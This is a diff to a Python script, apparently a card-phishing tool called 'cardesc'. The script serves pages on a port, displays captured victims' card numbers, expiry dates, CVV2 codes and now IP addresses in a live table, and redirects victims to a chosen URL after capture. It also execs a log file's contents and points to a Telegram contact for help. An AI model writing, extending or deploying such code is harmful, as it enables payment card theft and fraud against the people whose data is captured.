@@ -8,6 +8,9 @@ import requests
 os.system('clear || cls')
 with open("dist/log.log", "w") as dist:
     pass
+with open("dist/location.location", 'w') as loca:
+    loca.write("https://google.com")
+
 
 class A:
     def __call__(self):
@@ -16,7 +19,7 @@ class B:
     def __call__(self):
         while True:
             x = PrettyTable()
-            x.field_names = ['os', 'number', 'date', 'cvv2']
+            x.field_names = ['os', 'number', 'date', 'cvv2', 'ip']
             exec(open('dist/log.log').read())
             print(x)
             time.sleep(1)
@@ -65,6 +68,7 @@ if used=='0':
         print(logo)
         with open('result.log', 'r') as res:
             print(res.read())
+        print("# ",dot_info)
         exit()
     except:
         exit()
@@ -76,10 +80,10 @@ elif used=='1':
         ports=8080
     reloc = input("redirect or (enter): ")
     if (reloc == ""):
-        with open("dist/location.location", 'w') as loca:
-            loca.write("https://google.com")
-    else:
         pass
+    else:
+        with open("dist/location.location", 'w') as loca:
+            loca.write(reloc)
     a = A()
     b = B()
 
@@ -95,14 +99,8 @@ elif used == '2':
     os.system('clear || cls')
     print(logo)
     print(info_help)
-    print(f"""#  cardesc  v.{meta['version']}
-    apt update && apt upgrade
-    git clone https://github.com/oldnum/cardesc
-    cd cardesc
-    pip3 install -r requirements.txt
+    print(f"""# launch\n  python3 bank.py\n\n# Helping:\n[>] Telegram    : {meta['telegram']}\n """,dot_info)
 
-#  launch
-    python3 bank.py\n\nHelping:\n[>] Telegram    : {meta['telegram']}\n""")
     exit()
 else:
     os.system("clear || cls")
